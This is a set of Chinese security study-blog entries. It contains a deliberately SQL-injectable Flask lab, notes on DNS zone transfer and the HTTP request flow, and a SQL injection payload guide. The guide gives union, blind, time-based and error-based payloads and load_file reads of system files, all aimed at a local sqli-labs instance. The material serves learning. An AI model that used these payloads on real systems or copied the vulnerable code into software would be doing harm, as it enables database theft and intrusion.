&lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; login.html123456789101112131415&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/login&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; result.html12345678910111213141516171819&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt;​ &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/login&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt;​ &lt;/body&gt;&lt;/html&gt; blind_result.html12345678910111213141516&#123;% extends &quot;base.html&quot; %&#125;&#123;% block title %&#125;首页&#123;% endblock %&#125;&#123;% block page_content %&#125; &lt;table class=&quot;table table-bordered&quot;&gt; &lt;tr&gt; &lt;th&gt;用户ID&lt;/th&gt;&lt;/tr&gt; &#123;% for i in u %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; 正在查询中 &#125;&#125;&lt;/td&gt; &lt;/tr&gt;&#123;% endfor %&#125;&lt;/table&gt;&#123;% endblock %&#125; 目标：sql注入环境代码1、常规回显注入的代码前端提交数据，后端接受，sql语句直接执行 123456789101112@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username cursor.execute(sql) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result) 2、报错注入的代码打印数据库报错信息到前端即可 12345678910111213141516@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username))) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result) 3、盲注的代码盲注即不会回显数据到前端 123456789101112@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username)))​ db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(‘result.html’,u=result) if (result!=()): # 盲注 不显示查询到的结果返回前端 return ‘正在查询中’ return “404”,404​12 4、编写宽子节注入的代码，有问题~HTTP头部详解User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中） Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）. X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）. Clien-IP：同上，不做过多介绍. Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的. 参考资料http://www.voidcn.com/article/p-mzbkjrov-uo.html https://zhidao.baidu.com/question/751764377992914884.html https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/ https://_thorns.gitbooks.io/sec/content/httpqing_qiu_tou_xin_xi_de_zhu_ru.html https://zhuanlan.zhihu.com/p/27553821]]></content>
  </entry>
  <entry>
    <title><![CDATA[WEB页面解析流程]]></title>
    <url>%2F2019%2F09%2F19%2FWEB%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[[TOC] 1、理解域名解析的整个过程DNS是什么？DNS( Domain Name System)是“域名系统”的英文缩写,用于TCP/IP网络，它所提供的服务是用来将主机名和域名转换为IP地址的工作。 网络通讯大部分是基于TCP/IP的，而TCP/IP是基于IP地址的，所以计算机在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，而不能认识域名。我们无法记住10个以上IP地址的网站，所以我们访问网站时，更多的是在浏览器地址栏中输入域名，就能看到所需要的页面，这是因为有一个叫“DNS服务器”的计算机自动把我们的域名“翻译”成了相应的IP地址，然后调出IP地址所对应的网页。 工作流程： 1、在浏览器中输入www . qq .com 域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。 2、如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。 3、如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 4、如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。 5、如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询， （1）如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(http://qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找http://qq.com域服务器，重复上面的动作，进行查询，直至找到www . qq .com主机。 （2）如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。 ​ 从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。 DNS 域名称的五个类别 一些常见的DNS域名称 DNS记录 A记录 IP地址记录,记录一个域名对应的IP地址AAAA记录 IPv6 地址记录，记录一个域名对应的IPv6地址CNAME记录 别名记录，记录一个主机的别名MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析PTR记录 反向记录，也即从IP地址到域名的一条记录TXT记录 记录域名的相关文本信息 第一行Server是： DNS服务器的主机名 –114.114.114.114 第二行Address是： 服务器的ip地址 –114.114.114.114#53 非权威应答（Non-authoritative answer）： Name是：解析的URL –www.zsc0810.site Address是：47.105.32.145 DNS域传送漏洞：什么是DNS域传送？ DNS 服务器分为： 主服务器、备份服务器和缓存服务器。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 在主备服务器之间同步数据库，需要使用 “DNS 域传送 ” 。 危险：若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 （1）一键安装Dockercurl -s https://get.docker.com/ | sh 如果是使用一键安装工具安装的docker，则docker会自动启动。 （2）安装Docker Composecurl -L https://github.com/docker/compose/releases/download/1.7.0/docker-compose-`uname -s -uname -m` &gt; /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose docker-compose -v （3）下载Vulhub（4）启动环境进入相应路径 cd /path/to/vuln/ 运行 docker-compose up -d 结束 docker-compose down 启动192.168.1.100带有DNS域传送漏洞的DNS服务器 使用nmap扫描DNS域传送泄露漏洞 2 用dig来测试DNS服务器是否存在域传送泄露 3 DNS查询工具nslookup对DNS域传送的测试（在交互式shell中发现一个DNS服务器的域传送漏洞的过程） 操作基本的步骤是: 1) 输入nslookup命令进入交互式shell 2) Server 命令参数设定查询将要使用的DNS服务器 3) Ls命令列出某个域中的所有域名 4) Exit命令退出程序 攻击者能获取的敏感主要包括： 1）网络的拓扑结构，服务器集中的IP地址段 2）数据库服务器的IP地址，例如上述nwpudb2.nwpu.edu.cn 3）测试服务器的IP地址，例如test.nwpu.edu.cn 4）VPN服务器地址泄露 5）其他敏感服务器 2、WEB 页面请求的整个流程（从输入URL到页面加载发生了什么？）总的来说分为以下几个过程： DNS解析 TCP连接 发送HTTP请求 服务器处理请求并返回HTTP报文 浏览器解析渲染页面 连接结束具体过程 具体过程:DNS解析实现了网址到IP地址的转换。网址到IP地址转换的过程是如何进行的? 首先在本地域名服务器中查询IP地址，如果没有找到的情况下，本地域名服务器会向根域名服务器发送一个请求，如果根域名服务器也不存在该域名时，本地域名会向com顶级域名服务器发送一个请求，依次类推下去。直到最后本地域名服务器得到google的IP地址并把它缓存到本地，供下次查询使用。 所有网址真正的解析过程为: . -&gt; .com -&gt; google.com. -&gt; www.google.com.。 DNS优化如何减少该过程的步骤呢？那就是DNS缓存。 DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种: 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。 在你的chrome浏览器中输入:chrome://dns/，你可以看到chrome浏览器的DNS缓存。 系统缓存主要存在/etc/hosts(Linux系统)中: 谷歌浏览器缓存 DNS负载均衡DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容 TCP连接HTTP协议是使用TCP作为其传输层协议的 HTTPS协议的本质就是HTTP + SSL(or TLS)。在HTTP报文进入TCP报文之前，先使用SSL对HTTP报文进行加密。从网络的层级结构看它位于HTTP协议与TCP协议之间。 HTTPS过程HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。具体过程请参考经典的阮一峰先生的博客TLS/SSL握手过程。HTTPS相比于HTTP，虽然提供了安全保证，但是势必会带来一些时间上的损耗，如握手和加密等过程，是否使用HTTPS需要根据具体情况在安全和性能方面做出权衡。 HTTP请求HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。 请求行格式如下： Method Request-URL HTTP-Version CRLF eg: GET index.html HTTP/1.1 常用的方法有: GET, POST, PUT, DELETE, OPTIONS, HEAD。 请求报头请求报头允许客户端向服务器传递请求的附加信息和客户端自身的信息。 PS: 客户端不一定特指浏览器，有时候也可使用Linux下的CURL命令以及HTTP客户端测试工具等。常见的请求报头有: Accept, Accept-Charset, Accept-Encoding, Accept-Language, Content-Type, Authorization, Cookie, User-Agent等。 请求报头中使用了Accept, Accept-Encoding, Accept-Language, Cache-Control, Connection, Cookie等字段。Accept用于指定客户端用于接受哪些类型的信息，Accept-Encoding与Accept类似，它用于指定接受的编码方式。Connection设置为Keep-alive用于告诉客户端本次HTTP请求结束之后并不需要关闭TCP连接，这样可以使下次HTTP请求使用相同的TCP通道，节省TCP连接建立的时间。 请求正文当使用POST, PUT等方法时，通常需要客户端向服务器传递数据。这些数据就储存在请求正文中。在请求包头中有一些与请求正文相关的信息，例如:现在的Web应用通常采用Rest架构，请求的数据格式一般为json。这时就需要设置Content-Type: application/json。 服务器处理请求并返回HTTP报文后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTPRequest对象，供上层使用。这一部分工作一般是由Web服务器去进行，我使用过的Web服务器有Tomcat, Jetty和Netty等等。 HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。 状态码状态码是由3位数组成，第一个数字定义了响应的类别，且有五种可能取值: 1xx：指示信息–表示请求已接收，继续处理。 2xx：成功–表示请求已被成功接收、理解、接受。 3xx：重定向–要完成请求必须进行更进一步的操作。 4xx：客户端错误–请求有语法错误或请求无法实现。 5xx：服务器端错误–服务器未能实现合法的请求。平时遇到比较常见的状态码有:200, 204, 301, 302, 304, 400, 401, 403, 404, 422, 500 200：请求已成功。 204：服务器已处理请求，但不返回任何实体内容，并且希望返回更新了的元信息。若客户端是浏览器的话，那么浏览器应保留发送该请求的页面，而不更改任何文档视图。 301：永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。 302：临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI。 304：如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。 400：客户端请求包含语法错误，服务器无法理解。 401：请求要求用户进行身份认证。 403：服务器理解请求客户端的请求，但是拒绝执行此请求。 404：请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。 422：请求格式正确，但是由于含有语义错误，无法响应。 500：服务器内部错误。 响应报头常见的响应报头字段有: Server, Connection…。 响应报文服务器返回给浏览器的文本信息，通常HTML, CSS, JS, 图片等文件就放在这一部分。 浏览器解析渲染页面浏览器在收到HTML,CSS,JS文件后，它是如何把页面呈现到屏幕上的？下图对应的就是WebKit渲染的过程。 浏览器是一个边解析边渲染的过程。 JS的解析是由浏览器中的JS解析引擎完成的 浏览器在解析过程中，如果遇到请求外部资源时，如图像,iconfont,JS等。浏览器将重复1-6过程下载该资源。请求过程是异步的，并不会影响HTML文档进行加载，但是当文档加载过程中遇到JS文件，HTML文档会挂起渲染过程，不仅要等到文档中JS文件加载完毕还要等待解析执行完毕，才会继续HTML的渲染过程。原因是因为JS有可能修改DOM结构，这就意味着JS执行完成前，后续所有资源的下载是没有必要的，这就是JS阻塞后续资源下载的根本原因。CSS文件的加载不影响JS文件的加载，但是却影响JS文件的执行。JS代码执行前浏览器必须保证CSS文件已经下载并加载完毕。 WEB页面解析流程如图： nginx将HTTP请求处理流程分为11个阶段 NGX_HTTP_POST_READ_PHASE：第一个阶段，ngx_http_realip_module模块会注册handler到该阶段（nginx作为代理服务器时有用，后端以此获取客户端原始IP），而该模块默认不会开启，需要通过–with-http_realip_module启动； NGX_HTTP_SERVER_REWRITE_PHASE：server块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_FIND_CONFIG_PHASE：查找匹配的location配置；该阶段不能自定义handler； NGX_HTTP_REWRITE_PHASE：location块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_POST_REWRITE_PHASE：该阶段会检查是否发生了url重写，如果有，重新回到FIND_CONFIG阶段，否则直接进入下一个阶段；该阶段不能自定义handler； NGX_HTTP_PREACCESS_PHASE：访问控制，比如限流模块ngx_http_limit_req_module会注册handler到该阶段； NGX_HTTP_ACCESS_PHASE：访问权限控制，比如基于ip黑白名单的权限控制，基于用户名密码的权限控制等； NGX_HTTP_POST_ACCESS_PHASE：该阶段会根据访问权限控制阶段做相应处理，不能自定义handler； NGX_HTTP_TRY_FILES_PHASE：只有配置了try_files指令，才会有此阶段，不能自定义handler； NGX_HTTP_CONTENT_PHASE：内容产生阶段，返回响应给客户端；ngx_http_fastcgi_module模块就处于该阶段； NGX_HTTP_LOG_PHASE：该阶段会记录日志 参考资料https://www.zhihu.com/question/23042131/answer/66571369 https://www.freebuf.com/articles/web/190947.html http://www.lijiejie.com/dns-zone-transfer-1/ https://vulhub.org/#/docs/ https://segmentfault.com/a/1190000020178836 https://segmentfault.com/a/1190000006879700 https://segmentfault.com/a/1190000019263330 https://segmentfault.com/a/1190000006689767]]></content>
  </entry>
  <entry>
    <title><![CDATA[sql注入的payload]]></title>
    <url>%2F2019%2F09%2F01%2Fsql%E6%B3%A8%E5%85%A5%E7%9A%84payload%2F</url>
    <content type="text"><![CDATA[学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：获取payload通过sqlmap awvs等工具更新sqlmap ​ 内容太多，先放弃了 用着再查 通过谷歌 第二部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入 在URL加入了一些错误的SQL语句，被执行后返回了异常信息，这些异常信息当中包含了敏感信息 ▲联合查询的类型▲堆查询注入 回显注入：利用注入漏洞可以改变页面返回数据 ▲SQL 盲注•基于布尔 SQL 盲注 通过条件是否成立来判断substr截取第一个字符判断是否大于’a’，成立则页面返回数据 •基于时间的 SQL 盲注通过返回时间的长短判断 获取第一个字符的ascii码，判断是否大于115，不成立延时5秒返回 •基于报错的 SQL 盲注基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的基于程度和顺序的注入(哪里发生了影响)★一阶注射★二阶注射一阶注射是指输入的注射语句对 WEB 直接产生了影响， 出现了结果； 二阶注入类似存储型 XSS， 是指输入提交的语句， 无法直接对 WEB 应用程序产生影响， 通过其它的辅助间接的对 WEB 产生危害， 这样的就被称为是二阶注入. 基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射） 以上就是通常分类，先记录下，通过后面的实验练习加深理解 2、系统函数介绍几个常用函数： version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本 3、字符串连接函数 concat(str1,str2,…)——没有分隔符地连接字符串 concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 以上三个函数能一次性查出所有信息 . 4、一般用于尝试的语句 Ps:–+可以用#替换， url 提交过程中 Url 编码后的#为%23 or 1=1–+‘or 1=1–+“or 1=1–+)or 1=1–+‘)or 1=1–+“) or 1=1–+“))or 1=1–+ 一般的代码为：$id=$_GET[‘id’];$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点， 一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ， 一般采用两种思 路， 闭合后面的引号或者注释掉， 注释掉采用–+ 或者 #（%23） 5、union 操作符的介绍UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 请注意， UNION 内部的 SELECT语句必须拥有相同数量的列。 列也必须拥有相似的数据类型。 同时， 每条 SELECT 语句中的列的顺序必须相同。 SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2注释： 默认地， UNION 操作符选取不同的值。 如果允许重复的值， 请使用 UNION ALL。 另外， UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 6 、sql 中的逻辑运算万能密码： 正常 Select * from admin where username=’ admin’ and password=’ admin’ 密码：’ or 1=1# Select * from admin where username=’ admin’ and password=’ ’ or 1=1# where 子 句后有 三 个 条 件 语 句 ==username=’ admin’ andpassword=’ ’ or 1=1，在sql 中and 运算优先级大于or的运算优先级，结果恒为真。 7、 注入流程 数据库存储的数据形式如上图，注入的过程就是先拿到数据库名，再获取当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据 Mysql 有一个系统数据库 information_schema， 存储着所有的数据库的相关信息， 一般的，我们利用该表可以进行一次完整的注入。 以下为一般的流程 ： 猜数据库 ： 猜某库的数据表 ： select table_name from information_schema.tables where table_schema=’dvwa’ 猜某表的所有列 select column_name from information_schema.columns where table_name=’users’ 获取某列的内容 select * from 表名； 第部分：实验演示联合查询的类型 payload：-1’union select 1,group_concat(schema_name),3 from information_schema.schemata –+ 1、group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 2、union 联合注入， union 的作用是将两个 sql 语句进行联合， union 前后的两个 sql 语句的选择列数要相同才可以。 Union all 与 union 的区别是增加了去重的功能 3、当 id 的数据在数据库中不存在时， id=-1， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空，就将后面的语句的内容显示出来，此处前台页面返回了我们构造的 union 的数据 4、此处利用 order by 对前面的数据进行排序， 这里有三列数据， 我们就只能用order by 3,超过 3 就会报错。‘order by 4–+的结果显示结果超出。 盲注盲注：sql 注入过程中， sql 语句执行的选择后， 选择的数据不能回显，不返回数据库当中的信息到前端页面。 盲注可以分为三类： •基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 1： 基于布尔 SQL 盲注-构造逻辑判断 截取字符串相关函数解析 ▲left(database(),1)&gt;’ s’ //left()函数 Explain:database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位 ▲ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+ //substr()函数， ascii()函数 Explain： substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度。 Ascii()将某个字符转换为 ascii 值 ▲ascii(substr((select database()),1,1))=98 ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数， MID()函数 Explain： mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位Ord()函数同 ascii()， 将字符转为 ascii 值 ▲regexp 正则注入 存疑正则注入介绍用法介绍： select user() regexp ‘^[a-z]’;Explain： 正则表达式的用法， user()结果为 root， regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。 ▲like 匹配注入 和上述的正则类似， mysql 在匹配的时候我们可以用 ike 进行匹配。用法： select user() like ‘ro% 2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来 存疑▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql 重复特性， 此处重复了 version， 所以报错。 3:基于时间的 SQL 盲注–延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep IF表达式 1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 布尔盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39;and left(version(),1)=5# 1） 利用 left(database(),1)进行尝试 查看 version()， 数据库的版本号为 10.1.36, 这句话的意思是查看版本号第一位是不是1， 明显的返回的结果是正确的 当版本号不正确的时候， 则不能正确显示 you are in…… http://127.0.0.1/sqllib/Less-5/?id=1 ‘and length(database())=8 –+ 判读数据库长度 猜测数据库第一位 继而猜测第二位 采用二分法 报错盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39; union Select 1,count(),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)2))a from information_schema.columns group by a–+ 利用 double 数值类型超出范围进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3–+ 利用 bigint 溢出进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (!(select * from (select user())x) - ~0),2,3--+ xpath 函数报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+ http://127.0.0.1/sqllib/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)–+ 利用数据的重复性http://127.0.0.1/sqllib/Less-5/?id=1&#39;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+ 演示盲注演示http://127.0.0.1/sqllib/Less-5/?id=1’and if(ascii(substr(database(),1,1))=116,1,sleep(5))–+ 当错误的时候会有 5 秒的时间延时。 利用 BENCHMARK()进行延时注入 当结果正确的时候， 运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次， 会占用一段时间。 http://127.0.0.1/sqllib/Less-5/?id=1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+ 猜数据库： http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 说明第一位是 s （ascii 码是 115） http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+说明第二位是 e （ascii 码是 101） 以此类推 猜出数据的名字是security 猜测 security 的数据表：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+猜测第一个数据表的第一位是 e,…依次类推， 得到 emails http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+猜测第二个数据表的第一位是 r,…依次类推， 得到 referers 以此类推， 我们可以得到所有的数据表 emails,referers,uagents,users 猜测users表的列 http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select column_name from informationschema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+猜测 users 表的第一个列的第一个字符是 i，以此类推， 我们得到列名是 id， username， password 猜测 username 的值：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+猜测 username 的第一行的第一位以此类推， 我们得到数据库 username， password 的所有内容 文件的导入导出1、 load_file()导出文件Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。使用条件：A、 必须有权限读取并且文件必须完全可读and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。and (select count() from mysql.user)&gt;0/ 返回错误， 应该是管理员给数据库帐户降权B、 欲读取文件必须在服务器上C、 必须指定文件完整的路径Mysql 注入—sqlilabs—lcamry30D、 欲读取文件必须小于 max_allowed_packet如果该文件不存在， 或因为上面的任一原因而不能被读出， 函数返回空。 比较难满足的就是权限， 在 windows 下， 如果 NTFS 设置得当， 是不能读取相关的文件的， 当遇到只有administrators 才能访问的文件， users 就别想 load_file 出来。在实际的注入中， 我们有两个难点需要解决：绝对物理路径构造有效的畸形语句 （报错爆出绝对路径）在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务器的安全将受到严重的威胁。常用路径：http://www.cnblogs.com/lcamry/p/5729087.html示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\boot.ini)Explain:路径里的/用 \代替 2、 文件导入到数据库LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行， 并装入一个表中。 文件名称必须为一个文字字符串。 在注入过程中， 我们往往需要一些特殊的文件， 比如配置文件， 密码文件等。 当你具有数据库的权限时， 可以将系统文件利用 load data infile 导入到数据库中。 示例： load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’lines terminated by ‘\n’ 将/tmp/t0.txt 导入到 t0 表中， character set gbk 是字符集设置为 gbk， fields terminated by 